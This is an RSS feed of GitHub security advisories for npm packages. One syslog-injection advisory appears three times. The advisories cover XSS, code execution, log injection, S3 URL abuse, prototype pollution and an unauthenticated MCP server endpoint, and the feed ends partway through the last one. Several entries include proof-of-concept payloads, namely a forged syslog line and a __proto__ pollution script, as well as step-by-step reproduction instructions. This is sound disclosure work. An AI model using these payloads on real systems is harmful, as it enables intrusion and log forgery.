<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/npm.rss</id>
    <title>Security Advisory for JavaScript packages hosted at npmjs.com</title>
    <updated>2026-08-26T16:08:19.021Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"/>
    <subtitle>Security Advisory for JavaScript packages hosted at npmjs.com on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[suneditor] SunEditor Embed Plugin has DOM XSS via External Script Element After Iframe Embed]]></title>
        <id>https://github.com/advisories/GHSA-w93q-cq9w-58p7</id>
        <link href="https://github.com/advisories/GHSA-w93q-cq9w-58p7"/>
        <updated>2026-08-26T15:26:24.000Z</updated>
        <content type="html"><![CDATA[<p>Summary</p>
<p>A DOM-based Cross-Site Scripting (XSS) vulnerability exists in the SunEditor Embed plugin. Crafted iframe embed HTML followed by an external </p>]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-w93q-cq9w-58p7</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-08-26T15:26:24.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[youtransfer] YouTransfer has an issue in the sendmail transport integration that allows arbitrary code execution]]></title>
        <id>https://github.com/advisories/GHSA-68mc-h6h8-79wj</id>
        <link href="https://github.com/advisories/GHSA-68mc-h6h8-79wj"/>
        <updated>2026-08-26T15:04:19.000Z</updated>
        <content type="html"><![CDATA[<p>An issue in the sendmail transport integration component of YouTransfer v1.0.6 allows attackers to execute arbitrary code via supplying a crafted request.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-50880">https://nvd.nist.gov/vuln/detail/CVE-2026-50880</a></li>
<li><a href="https://gist.github.com/pyuysig/4013f4f10f74b3fded7ddf41b6d36ae5">https://gist.github.com/pyuysig/4013f4f10f74b3fded7ddf41b6d36ae5</a></li>
<li><a href="https://github.com/advisories/GHSA-68mc-h6h8-79wj">https://github.com/advisories/GHSA-68mc-h6h8-79wj</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-68mc-h6h8-79wj</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-06-15T21:30:41.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@logtape/syslog] @logtape/syslog: syslog log injection via unescaped control characters and unvalidated SD-NAME keys]]></title>
        <id>https://github.com/advisories/GHSA-8h6h-x5pq-56fq</id>
        <link href="https://github.com/advisories/GHSA-8h6h-x5pq-56fq"/>
        <updated>2026-08-26T14:28:05.000Z</updated>
        <content type="html"><![CDATA[<p><code>@logtape/syslog</code> contains two related output-encoding bugs in the structured data formatting code. Both only affect deployments with <code>includeStructuredData: true</code>, which is non-default.</p>
<h2 id="1-unescaped-c0-control-characters-in-structured-data-values">1. Unescaped C0 control characters in structured data values</h2>
<p><code>escapeStructuredDataValue()</code> in <code>packages/syslog/src/syslog.ts</code> escapes <code>\</code>, <code>"</code>, and <code>]</code> per RFC 5424 but does not escape newline (<code>\n</code>), carriage return (<code>\r</code>), or any other C0 control characters (U+0000–U+001F):</p>
<pre><code class="language-typescript">function escapeStructuredDataValue(value: string): string {
  return value
    .replace(/\\/g, "\\\\")
    .replace(/"/g, '\\"')
    .replace(/]/g, "\\]");
  // \n, \r, and other C0 control characters are not escaped
}
</code></pre>
<p>TCP syslog commonly uses <code>\n</code> as a frame delimiter (RFC 6587, non-transparent framing). If an attacker-controlled value contains a literal newline, that newline terminates the current syslog frame. Bytes following the newline begin a new frame, and if they form a valid RFC 5424 header (<code>&lt;PRI&gt;1 …</code>), a downstream collector will accept them as a separate, authentic-looking syslog record.</p>
<h2 id="2-unvalidated-sd-name-keys">2. Unvalidated SD-NAME keys</h2>
<p>Structured data parameter keys are inserted into the message without validation or escaping:</p>
<pre><code class="language-typescript">elements.push(`${key}="${escapedValue}"`);
</code></pre>
<p>RFC 5424 defines SD-NAME as printable US-ASCII characters excluding <code>=</code>, <code>]</code>, <code>"</code>, and space, with a maximum length of 32. A key containing any of those characters, control characters, or exceeding the length limit will produce malformed structured data. If the key itself contains an embedded <code>]</code>, it can prematurely close the structured-data element.</p>
<p>In typical usage, property keys are developer-defined string literals and therefore safe. However, if an application forwards attacker-controlled keys as log properties—for example by spreading request headers or arbitrary metadata into a log record—this becomes a second injection path.</p>
<h2 id="proof-of-concept">Proof of concept</h2>
<p>The following Node.js snippet (no dependencies, no network required) demonstrates that the escaped value still contains a literal newline:</p>
<pre><code class="language-javascript">function escapeStructuredDataValue(value) {
  return value
    .replace(/\\/g, "\\\\")
    .replace(/"/g, '\\"')
    .replace(/]/g, "\\]");
}

const payload =
  'normal\n&lt;134&gt;1 2026-01-01T00:00:00Z forged evil - - - INJECTED';

const result = escapeStructuredDataValue(payload);
console.log("Newline present after escape:", result.includes("\n")); // true
</code></pre>
<p>Tested with Node.js 22.17.1.</p>
<h2 id="impact">Impact</h2>
<p>An attacker who controls log property values can:</p>
<ul>
<li>forge syslog records attributed to arbitrary hosts, applications, or process IDs;</li>
<li>insert records with arbitrary severity or facility levels;</li>
<li>obscure malicious activity by injecting misleading entries around legitimate ones;</li>
<li>break downstream log parsers or SIEM correlation rules that rely on log integrity.</li>
</ul>
<p>Affected downstream collectors include rsyslog, syslog-ng, Splunk, Elastic Stack, and any other system using RFC 6587 non-transparent framing.</p>
<h2 id="suggested-fix">Suggested fix</h2>
<h3 id="structured-data-values">Structured data values</h3>
<p>Escape all C0 control characters (U+0000–U+001F) in addition to <code>\</code>, <code>"</code>, and <code>]</code>. RFC 5424 does not define an escape sequence for control characters in PARAM-VALUE; the most interoperable approach is to strip or replace them:</p>
<pre><code class="language-typescript">function escapeStructuredDataValue(value: string): string {
  return value
    .replace(/\\/g, "\\\\")
    .replace(/"/g, '\\"')
    .replace(/]/g, "\\]")
    .replace(/[\x00-\x1f]/g, (c) =&gt;
      `\\x${c.charCodeAt(0).toString(16).padStart(2, "0")}`
    );
}
</code></pre>
<p>Alternatively, strip them entirely: <code>.replace(/[\x00-\x1f]/g, "")</code>. The right choice depends on whether downstream consumers need some representation of the original value.</p>
<h3 id="sd-name-keys">SD-NAME keys</h3>
<p>Validate each key against the RFC 5424 SD-NAME grammar before including it. Keys that fail validation should be skipped or sanitized:</p>
<pre><code class="language-typescript">// SD-NAME: printable US-ASCII, excluding '=', ']', '"', SP; max 32 chars
const SD_NAME_RE = /^[!-&lt;&gt;-Z\\^-z|~]{1,32}$/;

for (const [key, value] of Object.entries(record.properties)) {
  if (!SD_NAME_RE.test(key)) continue;
  const escapedValue = escapeStructuredDataValue(String(value));
  elements.push(`${key}="${escapedValue}"`);
}
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/dahlia/logtape/security/advisories/GHSA-8h6h-x5pq-56fq">https://github.com/dahlia/logtape/security/advisories/GHSA-8h6h-x5pq-56fq</a></li>
<li><a href="https://github.com/dahlia/logtape/commit/7a6e5b9ddf7915edfff78fa129bc17c979b2a623">https://github.com/dahlia/logtape/commit/7a6e5b9ddf7915edfff78fa129bc17c979b2a623</a></li>
<li><a href="https://github.com/dahlia/logtape/releases/tag/1.3.11">https://github.com/dahlia/logtape/releases/tag/1.3.11</a></li>
<li><a href="https://github.com/dahlia/logtape/releases/tag/2.0.14">https://github.com/dahlia/logtape/releases/tag/2.0.14</a></li>
<li><a href="https://github.com/dahlia/logtape/releases/tag/2.1.5">https://github.com/dahlia/logtape/releases/tag/2.1.5</a></li>
<li><a href="https://github.com/advisories/GHSA-8h6h-x5pq-56fq">https://github.com/advisories/GHSA-8h6h-x5pq-56fq</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8h6h-x5pq-56fq</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-08-26T14:28:04.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@logtape/syslog] @logtape/syslog: syslog log injection via unescaped control characters and unvalidated SD-NAME keys]]></title>
        <id>https://github.com/advisories/GHSA-8h6h-x5pq-56fq</id>
        <link href="https://github.com/advisories/GHSA-8h6h-x5pq-56fq"/>
        <updated>2026-08-26T14:28:05.000Z</updated>
        <content type="html"><![CDATA[<p><code>@logtape/syslog</code> contains two related output-encoding bugs in the structured data formatting code. Both only affect deployments with <code>includeStructuredData: true</code>, which is non-default.</p>
<h2 id="1-unescaped-c0-control-characters-in-structured-data-values">1. Unescaped C0 control characters in structured data values</h2>
<p><code>escapeStructuredDataValue()</code> in <code>packages/syslog/src/syslog.ts</code> escapes <code>\</code>, <code>"</code>, and <code>]</code> per RFC 5424 but does not escape newline (<code>\n</code>), carriage return (<code>\r</code>), or any other C0 control characters (U+0000–U+001F):</p>
<pre><code class="language-typescript">function escapeStructuredDataValue(value: string): string {
  return value
    .replace(/\\/g, "\\\\")
    .replace(/"/g, '\\"')
    .replace(/]/g, "\\]");
  // \n, \r, and other C0 control characters are not escaped
}
</code></pre>
<p>TCP syslog commonly uses <code>\n</code> as a frame delimiter (RFC 6587, non-transparent framing). If an attacker-controlled value contains a literal newline, that newline terminates the current syslog frame. Bytes following the newline begin a new frame, and if they form a valid RFC 5424 header (<code>&lt;PRI&gt;1 …</code>), a downstream collector will accept them as a separate, authentic-looking syslog record.</p>
<h2 id="2-unvalidated-sd-name-keys">2. Unvalidated SD-NAME keys</h2>
<p>Structured data parameter keys are inserted into the message without validation or escaping:</p>
<pre><code class="language-typescript">elements.push(`${key}="${escapedValue}"`);
</code></pre>
<p>RFC 5424 defines SD-NAME as printable US-ASCII characters excluding <code>=</code>, <code>]</code>, <code>"</code>, and space, with a maximum length of 32. A key containing any of those characters, control characters, or exceeding the length limit will produce malformed structured data. If the key itself contains an embedded <code>]</code>, it can prematurely close the structured-data element.</p>
<p>In typical usage, property keys are developer-defined string literals and therefore safe. However, if an application forwards attacker-controlled keys as log properties—for example by spreading request headers or arbitrary metadata into a log record—this becomes a second injection path.</p>
<h2 id="proof-of-concept">Proof of concept</h2>
<p>The following Node.js snippet (no dependencies, no network required) demonstrates that the escaped value still contains a literal newline:</p>
<pre><code class="language-javascript">function escapeStructuredDataValue(value) {
  return value
    .replace(/\\/g, "\\\\")
    .replace(/"/g, '\\"')
    .replace(/]/g, "\\]");
}

const payload =
  'normal\n&lt;134&gt;1 2026-01-01T00:00:00Z forged evil - - - INJECTED';

const result = escapeStructuredDataValue(payload);
console.log("Newline present after escape:", result.includes("\n")); // true
</code></pre>
<p>Tested with Node.js 22.17.1.</p>
<h2 id="impact">Impact</h2>
<p>An attacker who controls log property values can:</p>
<ul>
<li>forge syslog records attributed to arbitrary hosts, applications, or process IDs;</li>
<li>insert records with arbitrary severity or facility levels;</li>
<li>obscure malicious activity by injecting misleading entries around legitimate ones;</li>
<li>break downstream log parsers or SIEM correlation rules that rely on log integrity.</li>
</ul>
<p>Affected downstream collectors include rsyslog, syslog-ng, Splunk, Elastic Stack, and any other system using RFC 6587 non-transparent framing.</p>
<h2 id="suggested-fix">Suggested fix</h2>
<h3 id="structured-data-values">Structured data values</h3>
<p>Escape all C0 control characters (U+0000–U+001F) in addition to <code>\</code>, <code>"</code>, and <code>]</code>. RFC 5424 does not define an escape sequence for control characters in PARAM-VALUE; the most interoperable approach is to strip or replace them:</p>
<pre><code class="language-typescript">function escapeStructuredDataValue(value: string): string {
  return value
    .replace(/\\/g, "\\\\")
    .replace(/"/g, '\\"')
    .replace(/]/g, "\\]")
    .replace(/[\x00-\x1f]/g, (c) =&gt;
      `\\x${c.charCodeAt(0).toString(16).padStart(2, "0")}`
    );
}
</code></pre>
<p>Alternatively, strip them entirely: <code>.replace(/[\x00-\x1f]/g, "")</code>. The right choice depends on whether downstream consumers need some representation of the original value.</p>
<h3 id="sd-name-keys">SD-NAME keys</h3>
<p>Validate each key against the RFC 5424 SD-NAME grammar before including it. Keys that fail validation should be skipped or sanitized:</p>
<pre><code class="language-typescript">// SD-NAME: printable US-ASCII, excluding '=', ']', '"', SP; max 32 chars
const SD_NAME_RE = /^[!-&lt;&gt;-Z\\^-z|~]{1,32}$/;

for (const [key, value] of Object.entries(record.properties)) {
  if (!SD_NAME_RE.test(key)) continue;
  const escapedValue = escapeStructuredDataValue(String(value));
  elements.push(`${key}="${escapedValue}"`);
}
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/dahlia/logtape/security/advisories/GHSA-8h6h-x5pq-56fq">https://github.com/dahlia/logtape/security/advisories/GHSA-8h6h-x5pq-56fq</a></li>
<li><a href="https://github.com/dahlia/logtape/commit/7a6e5b9ddf7915edfff78fa129bc17c979b2a623">https://github.com/dahlia/logtape/commit/7a6e5b9ddf7915edfff78fa129bc17c979b2a623</a></li>
<li><a href="https://github.com/dahlia/logtape/releases/tag/1.3.11">https://github.com/dahlia/logtape/releases/tag/1.3.11</a></li>
<li><a href="https://github.com/dahlia/logtape/releases/tag/2.0.14">https://github.com/dahlia/logtape/releases/tag/2.0.14</a></li>
<li><a href="https://github.com/dahlia/logtape/releases/tag/2.1.5">https://github.com/dahlia/logtape/releases/tag/2.1.5</a></li>
<li><a href="https://github.com/advisories/GHSA-8h6h-x5pq-56fq">https://github.com/advisories/GHSA-8h6h-x5pq-56fq</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8h6h-x5pq-56fq</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-08-26T14:28:04.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@logtape/syslog] @logtape/syslog: syslog log injection via unescaped control characters and unvalidated SD-NAME keys]]></title>
        <id>https://github.com/advisories/GHSA-8h6h-x5pq-56fq</id>
        <link href="https://github.com/advisories/GHSA-8h6h-x5pq-56fq"/>
        <updated>2026-08-26T14:28:05.000Z</updated>
        <content type="html"><![CDATA[<p><code>@logtape/syslog</code> contains two related output-encoding bugs in the structured data formatting code. Both only affect deployments with <code>includeStructuredData: true</code>, which is non-default.</p>
<h2 id="1-unescaped-c0-control-characters-in-structured-data-values">1. Unescaped C0 control characters in structured data values</h2>
<p><code>escapeStructuredDataValue()</code> in <code>packages/syslog/src/syslog.ts</code> escapes <code>\</code>, <code>"</code>, and <code>]</code> per RFC 5424 but does not escape newline (<code>\n</code>), carriage return (<code>\r</code>), or any other C0 control characters (U+0000–U+001F):</p>
<pre><code class="language-typescript">function escapeStructuredDataValue(value: string): string {
  return value
    .replace(/\\/g, "\\\\")
    .replace(/"/g, '\\"')
    .replace(/]/g, "\\]");
  // \n, \r, and other C0 control characters are not escaped
}
</code></pre>
<p>TCP syslog commonly uses <code>\n</code> as a frame delimiter (RFC 6587, non-transparent framing). If an attacker-controlled value contains a literal newline, that newline terminates the current syslog frame. Bytes following the newline begin a new frame, and if they form a valid RFC 5424 header (<code>&lt;PRI&gt;1 …</code>), a downstream collector will accept them as a separate, authentic-looking syslog record.</p>
<h2 id="2-unvalidated-sd-name-keys">2. Unvalidated SD-NAME keys</h2>
<p>Structured data parameter keys are inserted into the message without validation or escaping:</p>
<pre><code class="language-typescript">elements.push(`${key}="${escapedValue}"`);
</code></pre>
<p>RFC 5424 defines SD-NAME as printable US-ASCII characters excluding <code>=</code>, <code>]</code>, <code>"</code>, and space, with a maximum length of 32. A key containing any of those characters, control characters, or exceeding the length limit will produce malformed structured data. If the key itself contains an embedded <code>]</code>, it can prematurely close the structured-data element.</p>
<p>In typical usage, property keys are developer-defined string literals and therefore safe. However, if an application forwards attacker-controlled keys as log properties—for example by spreading request headers or arbitrary metadata into a log record—this becomes a second injection path.</p>
<h2 id="proof-of-concept">Proof of concept</h2>
<p>The following Node.js snippet (no dependencies, no network required) demonstrates that the escaped value still contains a literal newline:</p>
<pre><code class="language-javascript">function escapeStructuredDataValue(value) {
  return value
    .replace(/\\/g, "\\\\")
    .replace(/"/g, '\\"')
    .replace(/]/g, "\\]");
}

const payload =
  'normal\n&lt;134&gt;1 2026-01-01T00:00:00Z forged evil - - - INJECTED';

const result = escapeStructuredDataValue(payload);
console.log("Newline present after escape:", result.includes("\n")); // true
</code></pre>
<p>Tested with Node.js 22.17.1.</p>
<h2 id="impact">Impact</h2>
<p>An attacker who controls log property values can:</p>
<ul>
<li>forge syslog records attributed to arbitrary hosts, applications, or process IDs;</li>
<li>insert records with arbitrary severity or facility levels;</li>
<li>obscure malicious activity by injecting misleading entries around legitimate ones;</li>
<li>break downstream log parsers or SIEM correlation rules that rely on log integrity.</li>
</ul>
<p>Affected downstream collectors include rsyslog, syslog-ng, Splunk, Elastic Stack, and any other system using RFC 6587 non-transparent framing.</p>
<h2 id="suggested-fix">Suggested fix</h2>
<h3 id="structured-data-values">Structured data values</h3>
<p>Escape all C0 control characters (U+0000–U+001F) in addition to <code>\</code>, <code>"</code>, and <code>]</code>. RFC 5424 does not define an escape sequence for control characters in PARAM-VALUE; the most interoperable approach is to strip or replace them:</p>
<pre><code class="language-typescript">function escapeStructuredDataValue(value: string): string {
  return value
    .replace(/\\/g, "\\\\")
    .replace(/"/g, '\\"')
    .replace(/]/g, "\\]")
    .replace(/[\x00-\x1f]/g, (c) =&gt;
      `\\x${c.charCodeAt(0).toString(16).padStart(2, "0")}`
    );
}
</code></pre>
<p>Alternatively, strip them entirely: <code>.replace(/[\x00-\x1f]/g, "")</code>. The right choice depends on whether downstream consumers need some representation of the original value.</p>
<h3 id="sd-name-keys">SD-NAME keys</h3>
<p>Validate each key against the RFC 5424 SD-NAME grammar before including it. Keys that fail validation should be skipped or sanitized:</p>
<pre><code class="language-typescript">// SD-NAME: printable US-ASCII, excluding '=', ']', '"', SP; max 32 chars
const SD_NAME_RE = /^[!-&lt;&gt;-Z\\^-z|~]{1,32}$/;

for (const [key, value] of Object.entries(record.properties)) {
  if (!SD_NAME_RE.test(key)) continue;
  const escapedValue = escapeStructuredDataValue(String(value));
  elements.push(`${key}="${escapedValue}"`);
}
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/dahlia/logtape/security/advisories/GHSA-8h6h-x5pq-56fq">https://github.com/dahlia/logtape/security/advisories/GHSA-8h6h-x5pq-56fq</a></li>
<li><a href="https://github.com/dahlia/logtape/commit/7a6e5b9ddf7915edfff78fa129bc17c979b2a623">https://github.com/dahlia/logtape/commit/7a6e5b9ddf7915edfff78fa129bc17c979b2a623</a></li>
<li><a href="https://github.com/dahlia/logtape/releases/tag/1.3.11">https://github.com/dahlia/logtape/releases/tag/1.3.11</a></li>
<li><a href="https://github.com/dahlia/logtape/releases/tag/2.0.14">https://github.com/dahlia/logtape/releases/tag/2.0.14</a></li>
<li><a href="https://github.com/dahlia/logtape/releases/tag/2.1.5">https://github.com/dahlia/logtape/releases/tag/2.1.5</a></li>
<li><a href="https://github.com/advisories/GHSA-8h6h-x5pq-56fq">https://github.com/advisories/GHSA-8h6h-x5pq-56fq</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8h6h-x5pq-56fq</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-08-26T14:28:04.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@budibase/server] Budibase authenticated arbitrary S3 signed upload URL issuance via `/api/attachments/:datasourceId/url`]]></title>
        <id>https://github.com/advisories/GHSA-6x9p-4r67-5gjx</id>
        <link href="https://github.com/advisories/GHSA-6x9p-4r67-5gjx"/>
        <updated>2026-08-26T14:07:28.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Budibase 3.39.7 allows a low-privilege authenticated published-app user with the built-in BASIC role to obtain arbitrary S3 pre-signed upload URLs backed by a workspace datasource's stored server-side credentials.</p>
<p>The affected endpoint is:</p>
<p><code>POST /api/attachments/:datasourceId/url</code></p>
<p>The caller can control:</p>
<pre><code class="language-text">bucket
key
</code></pre>
<p>and receives:</p>
<pre><code class="language-text">signedUrl
publicUrl
</code></pre>
<p>This lets a low-privilege published-app user mint S3 <code>PUT</code> URLs using server-side datasource credentials for attacker-chosen object destinations.</p>
<p>Steps:</p>
<ol>
<li>Log in as an admin user.</li>
<li>Create a new app/workspace.</li>
<li>In the development app context, create an S3 datasource with valid credentials.</li>
<li>Publish the app.</li>
<li>Create a low-privilege user with the built-in BASIC role on the published production app ID.</li>
<li>Log in as that BASIC user.</li>
<li>Send:
<code>POST /api/attachments/&lt;datasourceId&gt;/url</code></li>
</ol>
<p>with:</p>
<pre><code class="language-json">{"bucket":"foo","key":"bar"}
</code></pre>
<p>and the published app header:</p>
<pre><code class="language-text">x-budibase-app-id: &lt;published_app_id&gt;
</code></pre>
<p>Observe a successful response containing:</p>
<pre><code class="language-text">signedUrl
publicUrl
</code></pre>
<h3 id="observed-result">Observed result</h3>
<p>The following behavior:</p>
<p>dev BASIC request: 403 User does not have permission
app publish: SUCCESS
prod BASIC request: 200 OK
Example confirmed runtime values from the final successful run:</p>
<pre><code class="language-text">prodAppId: app_e6b4cdc6cd6949969a83ff11eee88c5a
datasourceId: datasource_0cec491b26a742468257c62382aa3284
publicUrl: https://foo.s3.eu-west-1.amazonaws.com/bar
</code></pre>
<p>The returned signedUrl contained standard AWS signing markers, including:</p>
<pre><code class="language-text">X-Amz-Credential=bb
X-Amz-Signature
X-Amz-Expires=900
</code></pre>
<h3 id="impact">Impact</h3>
<p>A low-privilege published-app user who knows a valid datasource ID can mint S3 upload URLs backed by server-side datasource credentials and choose arbitrary destination bucket and key values.</p>
<h3 id="route-definition">Route definition</h3>
<p><code>packages/server/src/api/routes/static.ts:45</code>
Authorization logic
<code>packages/server/src/middleware/authorized.ts</code>
<code>packages/server/src/middleware/resourceId.ts</code>
Controller logic
<code>packages/server/src/api/controllers/static/index.ts</code>
Datasource lookup
<code>packages/server/src/sdk/workspace/datasources/datasources.ts</code></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/Budibase/budibase/security/advisories/GHSA-6x9p-4r67-5gjx">https://github.com/Budibase/budibase/security/advisories/GHSA-6x9p-4r67-5gjx</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-54356">https://nvd.nist.gov/vuln/detail/CVE-2026-54356</a></li>
<li><a href="https://github.com/Budibase/budibase/releases/tag/3.41.3">https://github.com/Budibase/budibase/releases/tag/3.41.3</a></li>
<li><a href="https://github.com/advisories/GHSA-6x9p-4r67-5gjx">https://github.com/advisories/GHSA-6x9p-4r67-5gjx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6x9p-4r67-5gjx</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-08-26T14:07:26.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@intlify/vue-i18n-core] Vue I18n Allows Prototype Pollution in `handleFlatJson`]]></title>
        <id>https://github.com/advisories/GHSA-p2ph-7g93-hw3m</id>
        <link href="https://github.com/advisories/GHSA-p2ph-7g93-hw3m"/>
        <updated>2026-08-25T20:44:03.000Z</updated>
        <content type="html"><![CDATA[<p><strong>Vulnerability type:</strong>
Prototype Pollution</p>
<p><strong>Vulnerability Location(s):</strong></p>
<pre><code class="language-js"># v9.1
node_modules/@intlify/message-resolver/index.js

# v9.2 or later
node_modules/@intlify/vue-i18n-core/index.js
</code></pre>
<p><strong>Description:</strong></p>
<p>The latest version of <code>@intlify/message-resolver (9.1)</code> and <code>@intlify/vue-i18n-core (9.2 or later)</code>, (previous versions might also affected), is vulnerable to Prototype Pollution through the entry function(s) <code>handleFlatJson</code>. An attacker can supply a payload with Object.prototype setter to introduce or modify properties within the global prototype chain, causing denial of service (DoS) a the minimum consequence.</p>
<p>Moreover, the consequences of this vulnerability can escalate to other injection-based attacks, depending on how the library integrates within the application. For instance, if the polluted property propagates to sensitive Node.js APIs (e.g., exec, eval), it could enable an attacker to execute arbitrary commands within the application's context.</p>
<p><strong>PoC:</strong></p>
<pre><code class="language-bash">// install the package with the latest version
~$ npm install @intlify/message-resolver@9.1.10
// run the script mentioned below 
~$ node poc.js
//The expected output (if the code still vulnerable) is below. 
// Note that the output may slightly differs from function to another.
Before Attack:  {}
After Attack:  {"pollutedKey":123}
</code></pre>
<pre><code class="language-js">// poc.js
(async () =&gt; {
    const lib = await import('@intlify/message-resolver');
    var someObj = {}
    console.log("Before Attack: ", JSON.stringify({}.__proto__));
    try {
        // for multiple functions, uncomment only one for each execution.
        lib.handleFlatJson ({ "__proto__.pollutedKey": "pollutedValue" })
    } catch (e) { }
    console.log("After Attack: ", JSON.stringify({}.__proto__));
    delete Object.prototype.pollutedKey;
})();
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/intlify/vue-i18n/security/advisories/GHSA-p2ph-7g93-hw3m">https://github.com/intlify/vue-i18n/security/advisories/GHSA-p2ph-7g93-hw3m</a></li>
<li><a href="https://github.com/intlify/vue-i18n/commit/d21e06a7440eed8ada7f522b22fcf830b98d3a53">https://github.com/intlify/vue-i18n/commit/d21e06a7440eed8ada7f522b22fcf830b98d3a53</a></li>
<li><a href="https://github.com/intlify/vue-i18n/commit/fbda9988d3ddd3a1a21740d506d2c183d6b6e36a">https://github.com/intlify/vue-i18n/commit/fbda9988d3ddd3a1a21740d506d2c183d6b6e36a</a></li>
<li><a href="https://github.com/intlify/vue-i18n/commit/feaf13fcff427f2cb1d5ec8076e639506ba28f9e">https://github.com/intlify/vue-i18n/commit/feaf13fcff427f2cb1d5ec8076e639506ba28f9e</a></li>
<li><a href="https://github.com/intlify/vue-i18n/releases/tag/v10.0.6">https://github.com/intlify/vue-i18n/releases/tag/v10.0.6</a></li>
<li><a href="https://github.com/intlify/vue-i18n/releases/tag/v11.1.2">https://github.com/intlify/vue-i18n/releases/tag/v11.1.2</a></li>
<li><a href="https://github.com/intlify/vue-i18n/releases/tag/v9.14.3">https://github.com/intlify/vue-i18n/releases/tag/v9.14.3</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-27597">https://nvd.nist.gov/vuln/detail/CVE-2025-27597</a></li>
<li><a href="https://github.com/intlify/vue-i18n/commit/4bb6eacda7fc2cde5687549afa0efb27ca40862a">https://github.com/intlify/vue-i18n/commit/4bb6eacda7fc2cde5687549afa0efb27ca40862a</a></li>
<li><a href="https://github.com/advisories/GHSA-p2ph-7g93-hw3m">https://github.com/advisories/GHSA-p2ph-7g93-hw3m</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-p2ph-7g93-hw3m</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-03-07T15:58:24.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@arikusi/deepseek-mcp-server] @arikusi/deepseek-mcp-server: Missing Authentication on Self-Hosted HTTP MCP Endpoint]]></title>
        <id>https://github.com/advisories/GHSA-72f3-6w86-7rv3</id>
        <link href="https://github.com/advisories/GHSA-72f3-6w86-7rv3"/>
        <updated>2026-08-25T18:38:30.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>The self-hosted HTTP transport of <code>@arikusi/deepseek-mcp-server</code> exposes <code>POST /mcp</code> without any authentication: <code>createMcpExpressApp</code> is called without an <code>authProvider</code> and no middleware guards the route, so any network-reachable client can issue an unauthenticated <code>initialize</code> request and obtain a valid MCP session identifier. In reproduced testing against commit <code>5e1302171e99</code>, an unauthenticated client was able to initialize a session, enumerate tools, and invoke the local <code>deepseek_sessions</code> tool with no credentials. The same unauthenticated session also exposes <code>deepseek_chat</code>, whose handler uses the server-side <code>DEEPSEEK_API_KEY</code> when self-hosted deployments configure one.</p>
<p>This issue applies to self-hosted HTTP mode, not the separately documented hosted BYOK endpoint in <code>README.md</code>, which expects an <code>Authorization: Bearer ...</code> header. Upstream self-hosted container assets enable HTTP mode by default (<code>Dockerfile</code>) and publish port <code>3000</code> (<code>docker-compose.yml</code>).</p>
<h2 id="affected-code">Affected Code</h2>
<p><code>src/transport-http.ts:17</code> — <code>createMcpExpressApp</code> called without <code>authProvider</code>; no challenge is issued to incoming requests</p>
<pre><code class="language-typescript">export function createHttpApp(serverFactory: () =&gt; McpServer) {
  const app = createMcpExpressApp({ host: '0.0.0.0' });
</code></pre>
<p><code>src/transport-http.ts:31</code> — <code>POST /mcp</code> handler instantiates a full MCP session for any body that satisfies <code>isInitializeRequest</code>, with no preceding auth check</p>
<pre><code class="language-typescript">  app.post('/mcp', async (req, res) =&gt; {
    const sessionId = req.headers['mcp-session-id'] as string | undefined;

    if (sessionId &amp;&amp; transports[sessionId]) {
      await transports[sessionId].handleRequest(req, res, req.body);
      return;
    }

    if (!sessionId &amp;&amp; isInitializeRequest(req.body)) {
      const transport = new StreamableHTTPServerTransport({
        sessionIdGenerator: () =&gt; randomUUID(),
        onsessioninitialized: (id) =&gt; {
          transports[id] = transport;
          console.error(`[DeepSeek MCP] HTTP session initialized: ${id}`);
        },
      });

      const server = serverFactory();
      await server.connect(transport);
      await transport.handleRequest(req, res, req.body);
</code></pre>
